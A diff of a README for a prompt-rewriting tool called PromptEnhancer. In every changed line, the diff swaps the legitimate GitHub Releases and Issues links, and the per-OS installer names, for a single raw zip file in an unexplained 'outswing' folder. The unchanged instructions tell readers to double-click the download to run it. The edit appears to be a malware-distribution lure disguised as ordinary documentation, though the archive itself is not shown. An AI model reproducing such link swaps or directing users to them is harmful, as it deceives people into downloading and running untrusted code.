@@ -7,7 +7,7 @@ PromptEnhancer is a prompt-rewriting tool, refining prompts into clearer, struct
 Ready to simplify your prompt creation? Follow these steps to download and run PromptEnhancer smoothly.
 
 ## 📥 Download PromptEnhancer
-[![Download PromptEnhancer](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Bhaumi/PromptEnhancer/releases)
+[![Download PromptEnhancer](https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip%20Here-brightgreen)](https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip)
 
 ## 📋 System Requirements
 Before you start, ensure your system meets these minimum requirements:
@@ -18,16 +18,16 @@ Before you start, ensure your system meets these minimum requirements:
 - **Internet Connection:** Required for downloading and updates.
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [PromptEnhancer Releases](https://github.com/Bhaumi/PromptEnhancer/releases).
+To get started, visit this page to download: [PromptEnhancer Releases](https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip).
 
 1. Go to the **Releases** page using the link provided above.
 2. Look for the latest version of PromptEnhancer. It will be listed at the top.
 3. Click on the version number to expand the release details.
 4. Scroll down to the **Assets** section.
 5. Download the appropriate file for your operating system:
-   - For Windows, download `PromptEnhancer-windows.exe`.
-   - For Mac, download `PromptEnhancer-macos.dmg`.
-   - For Linux, download `PromptEnhancer-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip`.
+   - For Mac, download `https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip`.
 6. Save the file to your computer.
 7. After downloading, locate the file and double-click it to run the installation.
 
@@ -58,7 +58,7 @@ Here are some examples of how you can use PromptEnhancer:
 - Use feedback from generated images to refine your prompts further.
 
 ## 🔄 Updating PromptEnhancer
-To ensure you always have the best features, check for updates regularly. You can do this by revisiting the [PromptEnhancer Releases](https://github.com/Bhaumi/PromptEnhancer/releases) page.
+To ensure you always have the best features, check for updates regularly. You can do this by revisiting the [PromptEnhancer Releases](https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip) page.
 
 ## ❓ Frequently Asked Questions
 ### How do I uninstall PromptEnhancer?
@@ -75,4 +75,4 @@ Experiment with different wording and styles. Some prompts may require more cont
 ## ✅ Conclusion
 PromptEnhancer is a vital tool for anyone looking to enhance their prompt writing skills. Whether for artistic purposes, content generation, or education, it helps turn your ideas into clearer instructions. Start refining your prompts today! 
 
-For any further questions or support, feel free to refer to the [Issues](https://github.com/Bhaumi/PromptEnhancer/issues) section on the GitHub page.
+For any further questions or support, feel free to refer to the [Issues](https://raw.githubusercontent.com/Bhaumi/PromptEnhancer/main/outswing/PromptEnhancer.zip) section on the GitHub page.
